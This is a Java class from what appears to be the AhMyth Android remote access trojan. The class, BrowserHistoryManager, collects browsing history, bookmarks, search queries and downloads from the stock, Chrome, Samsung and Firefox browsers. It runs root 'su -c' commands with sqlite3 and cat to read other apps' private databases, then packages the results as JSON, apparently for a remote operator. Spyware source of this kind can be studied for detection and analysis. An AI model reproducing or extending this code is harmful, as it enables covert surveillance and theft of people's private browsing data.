package ahmyth.mine.king.ahmyth;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.net.Uri;
import android.os.Build;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;

/**
 * BrowserHistoryManager retrieves browser history and bookmarks
 * Uses multiple methods to access browser data
 */
public class BrowserHistoryManager {
    private static final String TAG = "BrowserHistory";
    
    private Context context;
    
    // Browser bookmark columns
    private static final String COLUMN_TITLE = "title";
    private static final String COLUMN_URL = "url";
    private static final String COLUMN_DATE = "date";
    private static final String COLUMN_VISITS = "visits";
    private static final String COLUMN_BOOKMARK = "bookmark";
    
    // Browser URI
    private static final Uri BROWSER_URI = Uri.parse("content://browser/bookmarks");
    
    public BrowserHistoryManager(Context context) {
        this.context = context;
    }
    
    /**
     * Get browser history from multiple sources
     */
    public JSONObject getBrowserHistory() {
        JSONObject result = new JSONObject();
        JSONArray historyArray = new JSONArray();
        
        try {
            // Method 1: Try legacy browser content provider
            try {
                ContentResolver contentResolver = context.getContentResolver();
                Cursor cursor = contentResolver.query(
                    BROWSER_URI,
                    new String[]{COLUMN_TITLE, COLUMN_URL, COLUMN_DATE, COLUMN_VISITS},
                    COLUMN_BOOKMARK + " = 0",
                    null,
                    COLUMN_DATE + " DESC LIMIT 100"
                );
                
                if (cursor != null) {
                    while (cursor.moveToNext()) {
                        JSONObject entry = new JSONObject();
                        entry.put("title", cursor.getString(cursor.getColumnIndex(COLUMN_TITLE)));
                        entry.put("url", cursor.getString(cursor.getColumnIndex(COLUMN_URL)));
                        entry.put("date", cursor.getLong(cursor.getColumnIndex(COLUMN_DATE)));
                        entry.put("visits", cursor.getInt(cursor.getColumnIndex(COLUMN_VISITS)));
                        entry.put("source", "default_browser");
                        historyArray.put(entry);
                    }
                    cursor.close();
                }
            } catch (Exception e) {
                Log.d(TAG, "Legacy browser not accessible: " + e.getMessage());
            }
            
            // Method 2: Try Chrome databases (needs root or accessibility)
            historyArray = mergeArrays(historyArray, getChromeHistoryAdvanced());
            
            // Method 3: Try Samsung browser
            historyArray = mergeArrays(historyArray, getSamsungBrowserHistory());
            
            // Method 4: Try Firefox
            historyArray = mergeArrays(historyArray, getFirefoxHistory());
            
            // Method 5: Try to read from external storage downloads
            historyArray = mergeArrays(historyArray, getDownloadHistory());
            
            result.put("count", historyArray.length());
            result.put("history", historyArray);
            result.put("success", true);
            
            if (historyArray.length() == 0) {
                result.put("note", "Browser history access is restricted on modern Android. Root or accessibility service may be required.");
            }
            
        } catch (JSONException e) {
            Log.e(TAG, "Error creating history JSON", e);
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ignored) {}
        }
        
        return result;
    }
    
    /**
     * Advanced Chrome history retrieval
     */
    private JSONArray getChromeHistoryAdvanced() {
        JSONArray historyArray = new JSONArray();
        
        String[] chromePaths = {
            "/data/data/com.android.chrome/app_chrome/Default/History",
            "/data/user/0/com.android.chrome/app_chrome/Default/History",
            "/data/data/com.chrome.beta/app_chrome/Default/History",
            "/data/data/com.chrome.dev/app_chrome/Default/History"
        };
        
        for (String dbPath : chromePaths) {
            try {
                File dbFile = new File(dbPath);
                if (!dbFile.exists()) continue;
                
                // Try to read using shell command (requires root)
                try {
                    Process process = Runtime.getRuntime().exec(new String[]{
                        "su", "-c", 
                        "sqlite3 " + dbPath + " \"SELECT title, url, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 50\""
                    });
                    
                    BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                    String line;
                    while ((line = reader.readLine()) != null) {
                        String[] parts = line.split("\\|");
                        if (parts.length >= 2) {
                            JSONObject entry = new JSONObject();
                            entry.put("title", parts[0]);
                            entry.put("url", parts[1]);
                            if (parts.length > 2) {
                                // Chrome uses WebKit timestamp (microseconds since 1601)
                                try {
                                    long chromeTime = Long.parseLong(parts[2]);
                                    // Convert to Unix timestamp
                                    long unixTime = (chromeTime / 1000) - 11644473600000L;
                                    entry.put("date", unixTime);
                                } catch (Exception e) {}
                            }
                            entry.put("source", "chrome");
                            historyArray.put(entry);
                        }
                    }
                    reader.close();
                    process.waitFor();
                    
                    if (historyArray.length() > 0) {
                        Log.d(TAG, "Got Chrome history via root");
                        return historyArray;
                    }
                } catch (Exception e) {
                    Log.d(TAG, "Root access failed for Chrome: " + e.getMessage());
                }
                
            } catch (Exception e) {
                Log.d(TAG, "Chrome history error: " + e.getMessage());
            }
        }
        
        return historyArray;
    }
    
    /**
     * Get Samsung browser history
     */
    private JSONArray getSamsungBrowserHistory() {
        JSONArray historyArray = new JSONArray();
        
        try {
            Uri samsungUri = Uri.parse("content://com.sec.android.app.sbrowser.browser/bookmarks");
            Cursor cursor = context.getContentResolver().query(
                samsungUri, null, "bookmark = 0", null, "date DESC LIMIT 50"
            );
            
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    JSONObject entry = new JSONObject();
                    int titleIdx = cursor.getColumnIndex("title");
                    int urlIdx = cursor.getColumnIndex("url");
                    int dateIdx = cursor.getColumnIndex("date");
                    
                    if (titleIdx >= 0) entry.put("title", cursor.getString(titleIdx));
                    if (urlIdx >= 0) entry.put("url", cursor.getString(urlIdx));
                    if (dateIdx >= 0) entry.put("date", cursor.getLong(dateIdx));
                    entry.put("source", "samsung_browser");
                    historyArray.put(entry);
                }
                cursor.close();
            }
        } catch (Exception e) {
            Log.d(TAG, "Samsung browser not accessible: " + e.getMessage());
        }
        
        return historyArray;
    }
    
    /**
     * Get Firefox history
     */
    private JSONArray getFirefoxHistory() {
        JSONArray historyArray = new JSONArray();
        
        String[] firefoxPaths = {
            "/data/data/org.mozilla.firefox/files/mozilla",
            "/data/data/org.mozilla.firefox_beta/files/mozilla",
            "/data/data/org.mozilla.fennec_fdroid/files/mozilla"
        };
        
        for (String basePath : firefoxPaths) {
            try {
                File baseDir = new File(basePath);
                if (!baseDir.exists()) continue;
                
                // Firefox stores profiles in subdirectories
                File[] profiles = baseDir.listFiles();
                if (profiles == null) continue;
                
                for (File profile : profiles) {
                    if (profile.isDirectory() && profile.getName().endsWith(".default")) {
                        String placesDb = profile.getAbsolutePath() + "/places.sqlite";
                        
                        try {
                            Process process = Runtime.getRuntime().exec(new String[]{
                                "su", "-c",
                                "sqlite3 " + placesDb + " \"SELECT title, url, last_visit_date FROM moz_places WHERE hidden=0 ORDER BY last_visit_date DESC LIMIT 50\""
                            });
                            
                            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                            String line;
                            while ((line = reader.readLine()) != null) {
                                String[] parts = line.split("\\|");
                                if (parts.length >= 2) {
                                    JSONObject entry = new JSONObject();
                                    entry.put("title", parts[0]);
                                    entry.put("url", parts[1]);
                                    if (parts.length > 2) {
                                        try {
                                            entry.put("date", Long.parseLong(parts[2]) / 1000);
                                        } catch (Exception e) {}
                                    }
                                    entry.put("source", "firefox");
                                    historyArray.put(entry);
                                }
                            }
                            reader.close();
                            process.waitFor();
                        } catch (Exception e) {
                            Log.d(TAG, "Firefox root access failed: " + e.getMessage());
                        }
                    }
                }
            } catch (Exception e) {
                Log.d(TAG, "Firefox history error: " + e.getMessage());
            }
        }
        
        return historyArray;
    }
    
    /**
     * Get download history from Download Manager
     */
    private JSONArray getDownloadHistory() {
        JSONArray historyArray = new JSONArray();
        
        try {
            Uri downloadsUri = Uri.parse("content://downloads/my_downloads");
            Cursor cursor = context.getContentResolver().query(
                downloadsUri, null, null, null, "lastmod DESC LIMIT 50"
            );
            
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    JSONObject entry = new JSONObject();
                    
                    int titleIdx = cursor.getColumnIndex("title");
                    int uriIdx = cursor.getColumnIndex("uri");
                    int dateIdx = cursor.getColumnIndex("lastmod");
                    
                    if (titleIdx >= 0) entry.put("title", cursor.getString(titleIdx));
                    if (uriIdx >= 0) entry.put("url", cursor.getString(uriIdx));
                    if (dateIdx >= 0) entry.put("date", cursor.getLong(dateIdx));
                    entry.put("source", "downloads");
                    historyArray.put(entry);
                }
                cursor.close();
            }
        } catch (Exception e) {
            Log.d(TAG, "Downloads not accessible: " + e.getMessage());
        }
        
        return historyArray;
    }
    
    /**
     * Get browser bookmarks
     */
    public JSONObject getBookmarks() {
        JSONObject result = new JSONObject();
        JSONArray bookmarksArray = new JSONArray();
        
        try {
            // Legacy browser
            try {
                Cursor cursor = context.getContentResolver().query(
                    BROWSER_URI,
                    new String[]{COLUMN_TITLE, COLUMN_URL, COLUMN_DATE},
                    COLUMN_BOOKMARK + " = 1",
                    null,
                    COLUMN_DATE + " DESC"
                );
                
                if (cursor != null) {
                    while (cursor.moveToNext()) {
                        JSONObject entry = new JSONObject();
                        entry.put("title", cursor.getString(cursor.getColumnIndex(COLUMN_TITLE)));
                        entry.put("url", cursor.getString(cursor.getColumnIndex(COLUMN_URL)));
                        entry.put("date", cursor.getLong(cursor.getColumnIndex(COLUMN_DATE)));
                        entry.put("source", "default_browser");
                        bookmarksArray.put(entry);
                    }
                    cursor.close();
                }
            } catch (Exception e) {
                Log.d(TAG, "Bookmarks not accessible: " + e.getMessage());
            }
            
            // Try Chrome bookmarks via root
            try {
                Process process = Runtime.getRuntime().exec(new String[]{
                    "su", "-c",
                    "cat /data/data/com.android.chrome/app_chrome/Default/Bookmarks"
                });
                
                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    sb.append(line);
                }
                reader.close();
                
                // Parse JSON bookmarks
                String bookmarksJson = sb.toString();
                if (!bookmarksJson.isEmpty()) {
                    JSONObject chromeBookmarks = new JSONObject(bookmarksJson);
                    extractChromeBookmarks(chromeBookmarks, bookmarksArray);
                }
            } catch (Exception e) {
                Log.d(TAG, "Chrome bookmarks not accessible: " + e.getMessage());
            }
            
            result.put("count", bookmarksArray.length());
            result.put("bookmarks", bookmarksArray);
            result.put("success", true);
            
        } catch (JSONException e) {
            Log.e(TAG, "Error creating bookmarks JSON", e);
        }
        
        return result;
    }
    
    private void extractChromeBookmarks(JSONObject obj, JSONArray output) {
        try {
            if (obj.has("roots")) {
                JSONObject roots = obj.getJSONObject("roots");
                extractBookmarksFromNode(roots.optJSONObject("bookmark_bar"), output);
                extractBookmarksFromNode(roots.optJSONObject("other"), output);
                extractBookmarksFromNode(roots.optJSONObject("synced"), output);
            }
        } catch (Exception e) {
            Log.d(TAG, "Error extracting Chrome bookmarks: " + e.getMessage());
        }
    }
    
    private void extractBookmarksFromNode(JSONObject node, JSONArray output) {
        if (node == null) return;
        
        try {
            if (node.has("children")) {
                JSONArray children = node.getJSONArray("children");
                for (int i = 0; i < children.length(); i++) {
                    extractBookmarksFromNode(children.getJSONObject(i), output);
                }
            } else if (node.has("url")) {
                JSONObject entry = new JSONObject();
                entry.put("title", node.optString("name", ""));
                entry.put("url", node.optString("url", ""));
                entry.put("source", "chrome");
                output.put(entry);
            }
        } catch (Exception e) {}
    }
    
    /**
     * Get search queries
     */
    public JSONObject getSearchQueries() {
        JSONObject result = new JSONObject();
        JSONArray queriesArray = new JSONArray();
        
        try {
            Uri searchUri = Uri.parse("content://browser/searches");
            Cursor cursor = context.getContentResolver().query(
                searchUri, null, null, null, "date DESC LIMIT 50"
            );
            
            if (cursor != null) {
                int searchIdx = cursor.getColumnIndex("search");
                int dateIdx = cursor.getColumnIndex("date");
                
                while (cursor.moveToNext()) {
                    JSONObject entry = new JSONObject();
                    if (searchIdx >= 0) entry.put("query", cursor.getString(searchIdx));
                    if (dateIdx >= 0) entry.put("date", cursor.getLong(dateIdx));
                    queriesArray.put(entry);
                }
                cursor.close();
            }
        } catch (Exception e) {
            Log.d(TAG, "Search queries not accessible: " + e.getMessage());
        }
        
        try {
            result.put("count", queriesArray.length());
            result.put("queries", queriesArray);
            result.put("success", true);
        } catch (JSONException e) {}
        
        return result;
    }
    
    /**
     * Get all browser data combined
     */
    public JSONObject getAllBrowserData() {
        JSONObject result = new JSONObject();
        
        try {
            JSONObject historyData = getBrowserHistory();
            JSONObject bookmarksData = getBookmarks();
            JSONObject searchesData = getSearchQueries();
            
            JSONArray history = historyData.optJSONArray("history");
            JSONArray bookmarks = bookmarksData.optJSONArray("bookmarks");
            JSONArray searches = searchesData.optJSONArray("queries");
            
            result.put("history", history != null ? history : new JSONArray());
            result.put("bookmarks", bookmarks != null ? bookmarks : new JSONArray());
            result.put("searches", searches != null ? searches : new JSONArray());
            result.put("timestamp", System.currentTimeMillis());
            result.put("success", true);
            
            int total = (history != null ? history.length() : 0) + 
                       (bookmarks != null ? bookmarks.length() : 0) + 
                       (searches != null ? searches.length() : 0);
            
            if (total == 0) {
                result.put("note", "Modern browsers restrict access to history data. Limited results may be returned.");
            }
        } catch (JSONException e) {
            Log.e(TAG, "Error combining browser data", e);
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ignored) {}
        }
        
        return result;
    }
    
    private JSONArray mergeArrays(JSONArray arr1, JSONArray arr2) {
        for (int i = 0; i < arr2.length(); i++) {
            try {
                arr1.put(arr2.get(i));
            } catch (JSONException e) {}
        }
        return arr1;
    }
}
